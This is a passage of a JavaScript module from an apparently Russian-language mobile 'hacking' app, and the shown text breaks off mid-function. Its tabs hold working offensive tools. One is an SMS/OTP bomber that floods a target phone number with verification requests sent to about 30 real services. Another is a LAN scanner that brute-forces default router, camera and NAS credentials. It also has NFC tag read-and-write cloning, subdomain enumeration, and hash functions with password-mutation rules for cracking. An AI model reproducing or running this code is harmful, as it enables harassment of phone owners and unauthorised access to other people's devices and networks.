import { panel, button } from '../core/ui.js';

const $ = (t, c, x) => { const d = document.createElement(t); if (c) d.className = c; if (x != null) d.textContent = x; return d; };
const store = (k, v) => {
  if (v === undefined) { try { return JSON.parse(localStorage.getItem('wd.' + k) || '[]'); } catch { return []; } }
  localStorage.setItem('wd.' + k, JSON.stringify(v));
};
const IN = 'flex:1;min-width:110px;padding:7px;border-radius:8px;border:1px solid #14ff9a44;background:#08170f;color:#c9ffe6;font:inherit';
const NARROW = IN + ';flex:0 0 auto;width:58px;min-width:58px;text-align:center';
const CARD = 'border:1px solid #14ff9a33;border-radius:8px;padding:6px 8px;margin-bottom:6px;font-size:11px;word-break:break-all';
const row = (css) => { const d = $('div'); d.style.cssText = css || 'display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px'; return d; };
const save = (name, data) => {
  const a = $('a');
  a.href = URL.createObjectURL(new Blob([typeof data === 'string' ? data : JSON.stringify(data, null, 2)], { type: 'application/json' }));
  a.download = name; a.click();
};
const arr = (v) => Array.isArray(v) ? v : v ? [v] : [];

const K = []; for (let i = 0; i < 64; i++) K[i] = Math.floor(Math.abs(Math.sin(i + 1)) * 4294967296);
const SH = [7, 12, 17, 22, 5, 9, 14, 20, 4, 11, 16, 23, 6, 10, 15, 21];
const rotl = (x, c) => (x << c) | (x >>> (32 - c));
function md5(bytes) {
  const n = bytes.length, bits = n * 8, blocks = ((n + 8) >> 6) + 1;
  const M = new Uint8Array(blocks * 64); M.set(bytes); M[n] = 0x80;
  const dv = new DataView(M.buffer);
  dv.setUint32(blocks * 64 - 8, bits >>> 0, true);
  dv.setUint32(blocks * 64 - 4, Math.floor(bits / 4294967296), true);
  let a0 = 0x67452301, b0 = 0xefcdab89, c0 = 0x98badcfe, d0 = 0x10325476;
  for (let i = 0; i < blocks; i++) {
    const off = i * 64; let A = a0, B = b0, C = c0, D = d0;
    for (let j = 0; j < 64; j++) {
      let F, g;
      if (j < 16) { F = (B & C) | (~B & D); g = j; }
      else if (j < 32) { F = (D & B) | (~D & C); g = (5 * j + 1) % 16; }
      else if (j < 48) { F = B ^ C ^ D; g = (3 * j + 5) % 16; }
      else { F = C ^ (B | ~D); g = (7 * j) % 16; }
      const t = D; D = C; C = B;
      B = (B + rotl((A + F + K[j] + dv.getUint32(off + g * 4, true)) >>> 0, SH[(j >> 4) * 4 + (j % 4)])) >>> 0;
      A = t;
    }
    a0 = (a0 + A) >>> 0; b0 = (b0 + B) >>> 0; c0 = (c0 + C) >>> 0; d0 = (d0 + D) >>> 0;
  }
  const out = new Uint8Array(16), ov = new DataView(out.buffer);
  ov.setUint32(0, a0, true); ov.setUint32(4, b0, true); ov.setUint32(8, c0, true); ov.setUint32(12, d0, true);
  return out;
}
function md4(bytes) {
  const n = bytes.length, bits = n * 8, blocks = ((n + 8) >> 6) + 1;
  const M = new Uint8Array(blocks * 64); M.set(bytes); M[n] = 0x80;
  const dv = new DataView(M.buffer);
  dv.setUint32(blocks * 64 - 8, bits >>> 0, true);
  dv.setUint32(blocks * 64 - 4, Math.floor(bits / 4294967296), true);
  let a0 = 0x67452301, b0 = 0xefcdab89, c0 = 0x98badcfe, d0 = 0x10325476;
  const R = (x, c) => ((x << c) | (x >>> (32 - c))) >>> 0;
  const F = (x, y, z) => (x & y) | (~x & z), G = (x, y, z) => (x & y) | (x & z) | (y & z), H = (x, y, z) => x ^ y ^ z;
  for (let i = 0; i < blocks; i++) {
    const o = i * 64; let A = a0, B = b0, C = c0, D = d0;
    const x = (k) => dv.getUint32(o + k * 4, true);
    for (let j = 0; j < 16; j += 4) {
      A = R((A + F(B, C, D) + x(j)) >>> 0, 3); D = R((D + F(A, B, C) + x(j + 1)) >>> 0, 7);
      C = R((C + F(D, A, B) + x(j + 2)) >>> 0, 11); B = R((B + F(C, D, A) + x(j + 3)) >>> 0, 19);
    }
    const o2 = [0, 4, 8, 12, 1, 5, 9, 13, 2, 6, 10, 14, 3, 7, 11, 15];
    for (let j = 0; j < 16; j += 4) {
      A = R((A + G(B, C, D) + x(o2[j]) + 0x5a827999) >>> 0, 3); D = R((D + G(A, B, C) + x(o2[j + 1]) + 0x5a827999) >>> 0, 5);
      C = R((C + G(D, A, B) + x(o2[j + 2]) + 0x5a827999) >>> 0, 9); B = R((B + G(C, D, A) + x(o2[j + 3]) + 0x5a827999) >>> 0, 13);
    }
    const o3 = [0, 8, 4, 12, 2, 10, 6, 14, 1, 9, 5, 13, 3, 11, 7, 15];
    for (let j = 0; j < 16; j += 4) {
      A = R((A + H(B, C, D) + x(o3[j]) + 0x6ed9eba1) >>> 0, 3); D = R((D + H(A, B, C) + x(o3[j + 1]) + 0x6ed9eba1) >>> 0, 9);
      C = R((C + H(D, A, B) + x(o3[j + 2]) + 0x6ed9eba1) >>> 0, 11); B = R((B + H(C, D, A) + x(o3[j + 3]) + 0x6ed9eba1) >>> 0, 15);
    }
    a0 = (a0 + A) >>> 0; b0 = (b0 + B) >>> 0; c0 = (c0 + C) >>> 0; d0 = (d0 + D) >>> 0;
  }
  const out = new Uint8Array(16), ov = new DataView(out.buffer);
  ov.setUint32(0, a0, true); ov.setUint32(4, b0, true); ov.setUint32(8, c0, true); ov.setUint32(12, d0, true);
  return out;
}
const enc = new TextEncoder();
const hex = (b) => [...b].map(x => x.toString(16).padStart(2, '0')).join('');
async function digest(alg, str) {
  if (alg === 'MD5') return hex(md5(enc.encode(str)));
  if (alg === 'NTLM') { const u = new Uint8Array(str.length * 2); for (let i = 0; i < str.length; i++) u[i * 2] = str.charCodeAt(i); return hex(md4(u)); }
  return hex(new Uint8Array(await crypto.subtle.digest(alg, enc.encode(str))));
}
const HLEN = { MD5: 32, NTLM: 32, 'SHA-1': 40, 'SHA-256': 64, 'SHA-512': 128 };
const LEET = { a: '4', e: '3', o: '0', i: '1', s: '$', t: '7', b: '8', g: '9' };
const SUF = ['', '1', '12', '123', '1234', '12345', '!', '!!', '@', '#', '01', '007', '777', '2024', '2025', '2026', '2027'];
const mutate = (w) => {
  const out = new Set([w, w.toUpperCase()]);
  const cap = w.charAt(0).toUpperCase() + w.slice(1);
  out.add(cap);
  out.add(w.replace(/[aeoistbg]/g, c => LEET[c]));
  for (const s of SUF) { out.add(w + s); out.add(cap + s); }
  out.add([...w].reverse().join(''));
  out.add(w + w);
  return [...out].filter(Boolean);
};

export default {
  id: 'watchdogs',
  title: 'Взлом',
  icon: '⚡',
  order: 20,
  platforms: ['win', 'android'],
  mount(root) {
    const logBox = $('div');
    logBox.style.cssText = 'margin-top:8px;font-size:11px;color:#6fbf95;max-height:150px;overflow:auto;white-space:pre-wrap;word-break:break-word';
    const log = (m, c) => {
      const d = $('div', null, '> ' + m);
      if (c === 'ok') d.style.color = '#14ff9a';
      if (c === 'bad') d.style.color = '#ff5f6d';
      if (c === 'warn') d.style.color = '#ffd166';
      if (c === 'dim') d.style.opacity = '.6';
      logBox.append(d); logBox.scrollTop = logBox.scrollHeight;
      while (logBox.children.length > 300) logBox.firstChild.remove();
    };
    const body = $('div'), bar = $('div');
    bar.style.cssText = 'display:flex;gap:6px;overflow-x:auto;margin-bottom:10px';
    root.append(bar, body, logBox);

    const NFC = () => window.Capacitor?.Plugins?.NFC || window.Capacitor?.Plugins?.Nfc;
    const USB = () => window.Capacitor?.Plugins?.UsbSerial;
    const AIC = () => window.Capacitor?.Plugins?.AppIcon;
    const clip = async (t) => { try { await navigator.clipboard.writeText(t); log('в буфере: ' + t, 'ok'); } catch { log('буфер недоступен', 'bad'); } };
    const wait = (ms) => new Promise(k => setTimeout(k, ms));

    let bound = false;
    function bindNfc() {
      const p = NFC(); if (!p || bound) return; bound = true;
      p.addListener('nfcEvent', (ev) => {
        const t = ev?.nfcTag || {}; const uid = t.id || '';
        let ndef = '';
        try { ndef = (ev.ndefMessage || []).map(r => String.fromCharCode(...(r.payload || []).filter(b => b > 31 && b < 127))).join(' | '); } catch {}
        if (!uid && !ndef) return;
        log('МЕТКА ' + (uid || '—') + (ndef ? ' «' + ndef + '»' : ''), 'ok');
        const l = store('nfc'); l.unshift({ uid, tech: (t.techTypes || []).join(','), ndef, at: new Date().toISOString() });
        store('nfc', l.slice(0, 60)); drawNfc();
      });
    }
    function drawNfc() {
      const box = document.getElementById('wdNfc'); if (!box) return;
      box.innerHTML = ''; const l = store('nfc');
      if (!l.length) return box.append($('div', null, 'пусто — просканируй метку'));
      l.forEach((it, i) => {
        const c = $('div'); c.style.cssText = CARD;
        c.append($('div', null, (it.uid || '—') + (it.ndef ? ' «' + it.ndef + '»' : '')), $('div', null, (it.tech || 'tech?') + ' · ' + it.at.slice(0, 16).replace('T', ' ')));
        const r = row('display:flex;gap:6px;margin-top:6px');
        r.append(button('ЗАПИСАТЬ', async () => { try { await NFC().write({ records: [{ type: 'text', value: it.ndef || it.uid }] }); log('записано', 'ok'); } catch (e) { log('запись: ' + e.message, 'bad'); } }),
          button('УДАЛИТЬ', () => { const x = store('nfc'); x.splice(i, 1); store('nfc', x); drawNfc(); }));
        c.append(r); box.append(c);
      });
    }
    const tabNfc = () => {
      const r = row();
      r.append(button('СКАНИРОВАТЬ', async () => {
        if (!NFC()) return log('NFC-модуль не собран в этой сборке', 'bad');
        bindNfc();
        try { await NFC().startScanSession({ invalidateAfterFirstRead: true, alertMessage: 'Поднесите метку' }); log('сканирую', 'ok'); }
        catch (e) { log('ошибка: ' + e.message, 'bad'); }
      }), button('СТОП', async () => { try { await NFC().stopScanSession(); } catch {} }));
      const box = $('div'); box.id = 'wdNfc';
      body.append(r, box); drawNfc();
    };

    const SVC = [
      { n: 'Telegram', c: 1, m: 'POST', u: () => 'https://oauth.telegram.org/auth/send_password', b: (p) => 'phone=' + encodeURIComponent(p) },
      { n: 'VK', c: 1, m: 'GET', u: (p) => 'https://api.vk.com/method/auth.getCallPreview?phone=' + encodeURIComponent(p) + '&v=5.199' },
      { n: 'OK', c: 0, m: 'GET', u: (p) => 'https://ok.ru/dk?st.cmd=anonymRecoveryStart&st.phone=' + encodeURIComponent(p) },
      { n: 'Avito', c: 1, m: 'GET', u: (p) => 'https://www.avito.ru/api/1/auth/phone?phone=' + encodeURIComponent(p) },
      { n: 'Yandex', c: 0, m: 'GET', u: () => 'https://passport.yandex.ru/registration/mobile' },
      { n: 'Mail.ru', c: 0, m: 'POST', u: () => 'https://account.mail.ru/api/v1/user/register', b: (p) => 'phone=' + encodeURIComponent(p) },
      { n: 'Ozon', c: 0, m: 'GET', u: () => 'https://www.ozon.ru/api/composer-api.bx/page/json/v2?url=/auth' },
      { n: 'WB', c: 0, m: 'POST', u: () => 'https://www.wildberries.ru/webapi/auth/login', b: (p) => 'phone=' + encodeURIComponent(p) },
      { n: 'SberID', c: 0, m: 'POST', u: () => 'https://online.sberbank.ru/CSAFront/api/auth/phone', b: (p) => 'phone=' + encodeURIComponent(p) },
      { n: 'Tinkoff', c: 0, m: 'POST', u: () => 'https://www.tinkoff.ru/api/common/v1/session', b: (p) => 'phone=' + encodeURIComponent(p) },
      { n: 'Drom', c: 0, m: 'POST', u: () => 'https://www.drom.ru/api/auth/phone', b: (p) => 'phone=' + encodeURIComponent(p) },
      { n: 'Steam', c: 0, m: 'GET', u: () => 'https://store.steampowered.com/join/ajaxverifyemail' },
      { n: 'Rutube', c: 0, m: 'POST', u: () => 'https://rutube.ru/api/accounts/register/', b: (p) => 'phone=' + encodeURIComponent(p) },
      { n: 'Yappy', c: 0, m: 'POST', u: () => 'https://yappy.media/api/v1/auth/code', b: (p) => 'phone=' + encodeURIComponent(p) },
      { n: 'AliExpress', c: 0, m: 'GET', u: () => 'https://aliexpress.ru/' },
      { n: 'Lamoda', c: 0, m: 'POST', u: () => 'https://www.lamoda.ru/api/v1/auth/send-code', b: (p) => 'phone=' + encodeURIComponent(p) },
      { n: 'Megamarket', c: 0, m: 'POST', u: () => 'https://megamarket.ru/api/mobile/v1/auth/sendCode', b: (p) => 'phone=' + encodeURIComponent(p) },
      { n: 'Samokat', c: 0, m: 'POST', u: () => 'https://samokat.ru/api/v1/auth/phone', b: (p) => 'phone=' + encodeURIComponent(p) },
      { n: 'Kuper', c: 0, m: 'POST', u: () => 'https://kuper.ru/api/v1/auth/send-code', b: (p) => 'phone=' + encodeURIComponent(p) },
      { n: '2GIS', c: 0, m: 'POST', u: () => 'https://catalog.api.2gis.com/3.0/auth/sms', b: (p) => 'phone=' + encodeURIComponent(p) },
      { n: 'HH', c: 0, m: 'POST', u: () => 'https://hh.ru/auth/send-otp', b: (p) => 'phone=' + encodeURIComponent(p) },
      { n: 'Youla', c: 0, m: 'POST', u: () => 'https://youla.ru/api/auth/phone', b: (p) => 'phone=' + encodeURIComponent(p) },
      { n: 'Cdek', c: 0, m: 'POST', u: () => 'https://api.cdek.ru/v2/auth/phone', b: (p) => 'phone=' + encodeURIComponent(p) },
      { n: 'RZD', c: 0, m: 'GET', u: () => 'https://www.rzd.ru/' },
      { n: 'Beeline', c: 0, m: 'POST', u: () => 'https://beeline.ru/api/auth/sms', b: (p) => 'phone=' + encodeURIComponent(p) },
      { n: 'MTS', c: 0, m: 'POST', u: () => 'https://login.mts.ru/amserver/UI/Login', b: (p) => 'phone=' + encodeURIComponent(p) },
      { n: 'MegaFon', c: 0, m: 'POST', u: () => 'https://lk.megafon.ru/api/auth/sms', b: (p) => 'phone=' + encodeURIComponent(p) },
      { n: 'Tele2', c: 0, m: 'POST', u: () => 'https://tele2.ru/api/auth/sms', b: (p) => 'phone=' + encodeURIComponent(p) },
      { n: 'Yota', c: 0, m: 'POST', u: () => 'https://www.yota.ru/api/auth/phone', b: (p) => 'phone=' + encodeURIComponent(p) },
      { n: 'Pochta', c: 0, m: 'POST', u: () => 'https://otp.pochta.ru/api/v1/auth/send', b: (p) => 'phone=' + encodeURIComponent(p) }
    ];
    let floodRun = null;
    const fire = async (s, phone) => {
      const ctl = new AbortController();
      const tm = setTimeout(() => ctl.abort(), 9000);
      const opt = { method: s.m, signal: ctl.signal, credentials: 'omit', cache: 'no-store', redirect: 'follow', headers: {} };
      if (s.b) { opt.headers['Content-Type'] = 'application/x-www-form-urlencoded'; opt.body = s.b(phone); }
      try {
        const r = await fetch(s.u(phone), opt);
        return { sent: true, status: r.status };
      } catch {
        try { await fetch(s.u(phone), { ...opt, mode: 'no-cors' }); return { sent: true, status: 0 }; }
        catch { return { sent: false, status: -1 }; }
      } finally { clearTimeout(tm); }
    };
    const tabFlood = () => {
      const on = store('floodOn');
      const enabled = new Set(on.length ? on : SVC.filter(s => s.c === 1).map(s => s.n));
      const ph = $('input'); ph.placeholder = '+7XXXXXXXXXX'; ph.inputMode = 'tel'; ph.style.cssText = IN;
      const sel = $('select'); [1, 2, 3, 5, 10, 20].forEach(n => { const o = $('option', null, n + ' кругов'); o.value = n; sel.append(o); }); sel.style.cssText = NARROW;
      const par = $('select'); [1, 2, 4, 6, 8, 12].forEach(n => { const o = $('option', null, n + ' потоков'); o.value = n; par.append(o); }); par.selectedIndex = 3; par.style.cssText = NARROW;
      const gap = $('input'); gap.value = '400'; gap.inputMode = 'numeric'; gap.style.cssText = NARROW;
      const smart = $('input'); smart.type = 'checkbox'; smart.checked = true;
      const r1 = row();
      r1.append(ph, sel, par, gap, $('span', null, 'смарт'), smart);
      const grid = $('div'); grid.style.cssText = 'display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:4px;margin-bottom:8px;font-size:11px';
      const counters = {};
      SVC.forEach(s => {
        const lab = $('label'); lab.style.cssText = 'display:flex;gap:5px;align-items:center;padding:4px 6px;border:1px solid #14ff9a22;border-radius:6px;cursor:pointer';
        const cb = $('input'); cb.type = 'checkbox'; cb.checked = enabled.has(s.n);
        cb.onchange = () => { if (cb.checked) enabled.add(s.n); else enabled.delete(s.n); store('floodOn', [...enabled]); };
        const cnt = $('span'); cnt.textContent = s.c ? '★' : '·'; cnt.style.cssText = 'margin-left:auto;opacity:.7';
        counters[s.n] = cnt;
        lab.append(cb, $('span', null, s.n), cnt); grid.append(lab);
      });
      const stat = $('div'); stat.style.cssText = 'font-size:11px;color:#6fbf95;margin-bottom:6px';
      const start = async () => {
        if (floodRun) return log('уже идёт', 'bad');
        const phone = ph.value.replace(/[^\d+]/g, '');
        if (!phone || phone.length < 10) return log('введи номер полностью', 'bad');
        const list = SVC.filter(s => enabled.has(s.n));
        if (!list.length) return log('выбери сервисы', 'bad');
        const rounds = +sel.value, workers = +par.value, pause = Math.max(0, +gap.value || 0);
        const jobs = [];
        for (let r = 1; r <= rounds; r++) for (const s of list) jobs.push({ s, r });
        if (smart.checked) for (let i = jobs.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [jobs[i], jobs[j]] = [jobs[j], jobs[i]]; }
        floodRun = { stop: false };
        let cursor = 0, sent = 0;
        const total = jobs.length, t0 = Date.now();
        const tick = () => { stat.textContent = 'круг ' + (jobs[Math.min(cursor, total - 1)]?.r || 1) + '/' + rounds + ' · отправлено ' + sent + '/' + total + ' · ' + Math.round((Date.now() - t0) / 1000) + 'с'; };
        log('СТАРТ: ' + list.length + ' сервисов × ' + rounds + ' кругов, потоков ' + workers, 'ok'); tick();
        const worker = async () => {
          while (!floodRun.stop && cursor < jobs.length) {
            const job = jobs[cursor++];
            const res = await fire(job.s, phone);
            if (res.sent) {
              sent++;
              counters[job.s.n].textContent = (parseInt(counters[job.s.n].textContent, 10) || 0) + 1;
              log(job.s.n + (res.status ? ' → ' + res.status : ' → ушло'), job.s.c ? 'ok' : 'dim');
            } else log(job.s.n + ' → отказ', 'bad');
            tick();
            if (pause) await wait(pause + Math.random() * pause);
          }
        };
        await Promise.all(Array.from({ length: Math.min(workers, jobs.length) }, worker));
        floodRun = null;
        const ok = sent > 0;
        log((ok ? 'ГОТОВО ' : 'ПУСТО ') + sent + '/' + total + ' за ' + Math.round((Date.now() - t0) / 1000) + 'с', ok ? 'ok' : 'bad');
        if (sent > 0) log('часть сервисов может забанить номер на 10–15 мин', 'warn');
        store('floodLog', { at: new Date().toISOString(), phone, sent, total });
      };
      const r2 = row();
      r2.append(button('ЗАПУСТИТЬ', start), button('СТОП', () => { if (floodRun) floodRun.stop = true; }),
        button('ВСЕ', () => { SVC.forEach(s => enabled.add(s.n)); store('floodOn', [...enabled]); grid.querySelectorAll('input').forEach(i => i.checked = true); }),
        button('СБРОС', () => { enabled.clear(); SVC.filter(s => s.c === 1).forEach(s => enabled.add(s.n)); store('floodOn', [...enabled]); [...grid.querySelectorAll('input')].forEach((i, k) => i.checked = !!SVC[k].c); }),
        button('ЭКСПОРТ', () => save('morfy-flood-' + Date.now() + '.json', store('floodLog'))));
      body.append(r1, r2, stat, grid);
    };

    const GW = ['192.168.0.1', '192.168.1.1', '192.168.31.1', '192.168.8.1', '192.168.100.1', '10.0.0.1', '10.0.1.1'];
    const DEFAULT_PORTS = '80,443,8080,8443,8000,81,88,5000,3000,9000,8081,7547,631,8888,9090,10000';
    const PAIRS = [['admin', 'admin'], ['admin', '1234'], ['admin', 'password'], ['admin', 'admin12345'], ['admin', '888888'], ['admin', ''], ['root', 'root'], ['ubnt', 'ubnt'], ['guest', 'guest'], ['telecomadmin', 'admintelecom'], ['support', 'support']];
    const VENDOR = [
      [/(tp-?link|archer)/i, 'TP-Link: admin/admin, admin/1234'],
      [/(d-?link|dir-)/i, 'D-Link: admin/admin, admin/(пусто)'],
      [/(keenetic|zyxel)/i, 'Keenetic/Zyxel: admin/1234, admin/admin'],
      [/(asus|rt-)/i, 'ASUS: admin/admin, admin/(пусто)'],
      [/(mikrotik|routeros)/i, 'MikroTik: admin/(пусто)'],
      [/(huawei|hg8)/i, 'Huawei: admin/admin, telecomadmin/admintelecom'],
      [/(sagemcom|sercomm|rostelecom)/i, 'Sagemcom: admin/admin, admin/1234'],
      [/(tenda)/i, 'Tenda: admin/(пусто)'],
      [/(netis|netcore)/i, 'Netis: guest/guest, admin/admin'],
      [/(ubiquiti|unifi|airmax)/i, 'Ubiquiti: ubnt/ubnt'],
      [/(hikvision)/i, 'Hikvision: admin/12345, admin/admin12345'],
      [/(dahua)/i, 'Dahua: admin/admin, admin/888888'],
      [/(synology|diskstation)/i, 'Synology: admin/(пусто)'],
      [/(qnap)/i, 'QNAP: admin/admin'],
      [/(hp|laserjet)/i, 'HP: admin/(пусто), admin/admin'],
      [/(canon)/i, 'Canon: admin/(пусто)'],
      [/(brother)/i, 'Brother: admin/access'],
      [/(epson)/i, 'Epson: admin/(пусто), EPSONWEB/admin']
    ];
    const probe = async (url, ms) => {
      const ctl = new AbortController();
      const tm = setTimeout(() => ctl.abort(), ms || 1200);
      try { const r = await fetch(url, { mode: 'no-cors', cache: 'no-store', signal: ctl.signal }); return r; }
      catch { return null; } finally { clearTimeout(tm); }
    };
    const tabNet = () => {
      const base = $('input'); base.placeholder = '192.168.1'; base.inputMode = 'decimal'; base.style.cssText = IN;
      const ports = $('input'); ports.value = DEFAULT_PORTS; ports.style.cssText = IN + ';min-width:220px';
      const par = $('select'); [8, 16, 32, 64].forEach(n => { const o = $('option', null, n + ' потоков'); o.value = n; par.append(o); }); par.selectedIndex = 1; par.style.cssText = NARROW;
      const out = $('div');
      let scan = null;
      const head = (url, host, status) => {
        const c = $('div'); c.style.cssText = CARD + ';border-color:#14ff9a66';
        c.append($('div', null, host + (status ? ' · ' + status : '')));
        const pr = $('div'); pr.style.cssText = 'margin:4px 0';
        const r = row('display:flex;gap:6px;margin-top:4px;flex-wrap:wrap');
        r.append(button('ОТКРЫТЬ', () => window.open(url, '_blank')),
          button('ОПОЗНАТЬ', async () => {
            log('опознаю ' + host + '…', 'dim');
            try {
              const t = await (await fetch('https://r.jina.ai/' + url)).text();
              const title = (/title:\s*([^\n]{0,120})/i.exec(t) || [])[1] || t.replace(/\s+/g, ' ').slice(0, 120);
              pr.textContent = title.trim() || '(без заголовка)';
              const hit = VENDOR.find(([re]) => re.test(t));
              if (hit) pr.append($('div', null, 'пароли по умолчанию → ' + hit[1]));
              log('опознано: ' + (title.trim().slice(0, 60) || '?'), 'ok');
            } catch (e) { log('не опознано: ' + e.message, 'bad'); }
          }),
          button('ПАРОЛИ', async () => {
            log('проверяю базовые пары на ' + host + '…', 'dim');
            let hit = 0;
            for (const [u, p] of PAIRS) {
              try {
                const r = await fetch(url, { headers: { Authorization: 'Basic ' + btoa(u + ':' + p) }, cache: 'no-store' });
                if (r.status === 200) { hit++; log('ПОДОШЛО ' + u + ':' + (p || '(пусто)'), 'ok'); pr.append($('div', null, '✓ ' + u + ':' + (p || '(пусто)'))); }
              } catch {}
              await wait(150);
            }
            if (!hit) log('базовые пары не подошли', 'bad');
          }),
          button('КОПИРОВАТЬ', () => clip(url)));
        c.append(pr, r); out.append(c);
      };
      const run = async () => {
        if (scan) return log('скан идёт', 'bad');
        const b = base.value.trim().replace(/\.$/, '');
        if (!/^\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(b)) return log('нужен префикс вида 192.168.1', 'bad');
        const ps = [...new Set(ports.value.split(/[^\d]+/).filter(Boolean).map(Number).filter(n => n > 0 && n < 65536))];
        if (!ps.length) return log('нет портов', 'bad');
        out.innerHTML = ''; scan = { stop: false };
        let cursor = 0, done = 0;
        const hosts = Array.from({ length: 254 }, (_, i) => b + '.' + (i + 1));
        const total = hosts.length * ps.length;
        log('скан ' + b + '.0/24, портов ' + ps.length + ' (' + total + ' проверок)', 'ok');
        const found = new Map();
        const worker = async () => {
          while (!scan.stop && cursor < total) {
            const k = cursor++;
            const host = hosts[Math.floor(k / ps.length)], port = ps[k % ps.length];
            const scheme = port === 443 || port === 8443 ? 'https' : 'http';
            const url = scheme + '://' + host + ':' + port + '/';
            const r = await probe(url);
            done++;
            if (r) {
              log('ОТКРЫТО ' + host + ':' + port + (r.status ? ' (' + r.status + ')' : ''), 'ok');
              if (!found.has(host)) { found.set(host, []); head(url, host, r.status); }
              found.get(host).push(port);
            }
            if (done % 40 === 0) log('прогресс ' + done + '/' + total, 'dim');
          }
        };
        await Promise.all(Array.from({ length: Math.min(+par.value, total) }, worker));
        scan = null;
        log(found.size ? 'найдено узлов: ' + found.size : 'пусто — проверь префикс и что ты в той же сети', found.size ? 'ok' : 'bad');
        if (found.size) store('netLast', { at: new Date().toISOString(), base: b, hosts: [...found.keys()] });
      };
      const findGw = async () => {
        log('ищу шлюз…', 'dim');
        for (const g of GW) {
          const r = await probe('http://' + g + '/', 900);
          if (r) { base.value = g.split('.').slice(0, 3).join('.'); log('шлюз ' + g + ' — префикс подставлен', 'ok'); return; }
        }
        log('шлюз не ответил, впиши префикс руками', 'bad');
      };
      const r1 = row();
      r1.append(base, ports, par);
      const r2 = row();
      r2.append(button('НАЙТИ ШЛЮЗ', findGw), button('СКАН', run), button('СТОП', () => { if (scan) scan.stop = true; }),
        button('ЭКСПОРТ', () => save('morfy-net-' + Date.now() + '.json', store('netLast'))));
      body.append(r1, r2, out, $('div', null, 'Ищутся HTTP(S)-сервисы: роутеры, NAS, камеры, принтеры, панели. «ПАРОЛИ» перебирает базовые пары по Basic-авторизации.'));
    };

    const SUBS = 'www mail smtp pop imap ftp dev test stage staging api gateway admin panel cdn static img media files vpn remote ssh git gitlab jenkins ci build db sql backup old new beta alpha demo app mobile m vps host ns1 ns2 dns mx web portal auth sso oauth uploads docs wiki status shop store pay billing support help office internal intranet corp ad dc ldap radius ntp syslog nas cloud s3 docker k8s grafana promo news blog forum chat'.split(' ');
    const tabDns = () => {
      const dom = $('input'); dom.placeholder = 'example.com'; dom.style.cssText = IN;
      const out = $('div');
      let run = null;
      const doh = async (name, type) => {
        const r = await fetch('https://dns.google/resolve?name=' + encodeURIComponent(name) + '&type=' + type);
        if (!r.ok) throw new Error('doh ' + r.status);
        return r.json();
      };
      const line = (t, v) => { const c = $('div'); c.style.cssText = CARD; c.append($('div', null, t), $('div', null, v)); out.append(c); };
      const clean = () => { const d = dom.value.trim().toLowerCase().replace(/^https?:\/\//, '').replace(/\/.*$/, ''); return /^[a-z0-9.-]+\.[a-z]{2,}$/.test(d) ? d : null; };
      const records = async () => {
        const d = clean(); if (!d) return log('нужен домен вида example.com', 'bad');
        out.innerHTML = ''; log('записи ' + d, 'dim');
        for (const t of ['A', 'AAAA', 'MX', 'TXT', 'NS', 'CNAME', 'SOA', 'CAA']) {
          try {
            const j = await doh(d, t);
            (j.Answer || []).forEach(a => line(t, a.data));
          } catch (e) { log(t + ': ' + e.message, 'bad'); }
          await wait(120);
        }
        log('готово', 'ok');
      };
      const subs = async () => {
        const d = clean(); if (!d) return log('нужен домен', 'bad');
        if (run) return log('уже идёт', 'bad');
        run = { stop: false }; out.innerHTML = '';
        let wild = null;
        try { const j = await doh('zz' + Math.random().toString(36).slice(2, 8) + '.' + d, 'A'); wild = (j.Answer || []).map(a => a.data).join(','); } catch {}
        if (wild) log('WILDCARD включён (' + wild + ')', 'warn');
        let found = 0, cursor = 0;
        const worker = async () => {
          while (!run.stop && cursor < SUBS.length) {
            const s = SUBS[cursor++];
            const name = s + '.' + d;
            try {
              const j = await doh(name, 'A');
              const ips = (j.Answer || []).filter(a => a.type === 1).map(a => a.data);
              if (ips.length) {
                found++;
                const c = $('div'); c.style.cssText = CARD + ';border-color:#14ff9a66';
                c.append($('div', null, name), $('div', null, ips.join(', ')));
                const r = row('display:flex;gap:6px;margin-top:4px');
                r.append(button('КОПИРОВАТЬ', () => clip(name)), button('ОТКРЫТЬ', () => window.open('https://' + name, '_blank')));
                c.append(r); out.append(c); log(name + ' → ' + ips.join(','), 'ok');
              }
            } catch {}
            if (cursor % 12 === 0) await wait(80);
          }
        };
        await Promise.all(Array.from({ length: 6 }, worker));
        run = null;
        log('субдомены: найдено ' + found + ' из ' + SUBS.length, found ? 'ok' : 'bad');
      };
      const crt = async () => {
        const d = clean(); if (!d) return log('нужен домен', 'bad');
        log('crt.sh…', 'dim');
        let txt = '';
        try { txt = await (await fetch('https://crt.sh/?q=%25.' + d + '&output=json')).text(); } catch {}
        if (!/^\[/.test(txt.trim())) { try { txt = await (await fetch('https://r.jina.ai/https://crt.sh/?q=%25.' + d + '&output=json')).text(); } catch {} }
        const names = new Set();
        for (const m of txt.matchAll(/[a-z0-9*_.-]+\./g)) {
          const n = m[0].replace(/\.$/, '').replace(/^\*\./, '').toLowerCase();
          if (n.endsWith(d)) names.add(n);
        }
        if (!names.size) return log('crt.sh пусто или недоступен', 'bad');
        [...names].sort().forEach(n => { if (!out.textContent.includes(n)) line('crt.sh', n); });
        log('из сертификатов: ' + names.size, 'ok');
      };
      const r1 = row();
      r1.append(dom, button('РЕЗОЛВ', records), button('СУБДОМЕНЫ', subs), button('CRT.SH', crt),
        button('СТОП', () => { if (run) run.stop = true; }),
        button('ЭКСПОРТ', () => save('morfy-dns-' + Date.now() + '.json', out.textContent)));
      body.append(r1, out, $('div', null, 'Резолв через dns.google (DoH), словарь на ~60 имён, плюс имена из сертификатов crt.sh.'));
    };

    const tabIp = () => {
      const ta = $('textarea'); ta.placeholder = 'Вставь логи/текст — IP вытащу сам'; ta.style.cssText = IN + ';width:100%;min-height:70px';
      const out = $('div');
      body.append(ta, button('РАЗОБРАТЬ И ПРОБИТЬ', async () => {
        const ips = [...new Set((ta.value.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || []).filter(i => i.split('.').every(o => +o < 256)))];
        log('нашёл ' + ips.length, ips.length ? 'ok' : 'bad'); out.innerHTML = '';
        for (let i = 0; i < ips.length; i += 100) {
          try {
            const d = await (await fetch('http://ip-api.com/batch?fields=query,country,city,isp,org,as,proxy,hosting', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(ips.slice(i, i + 100)) })).json();
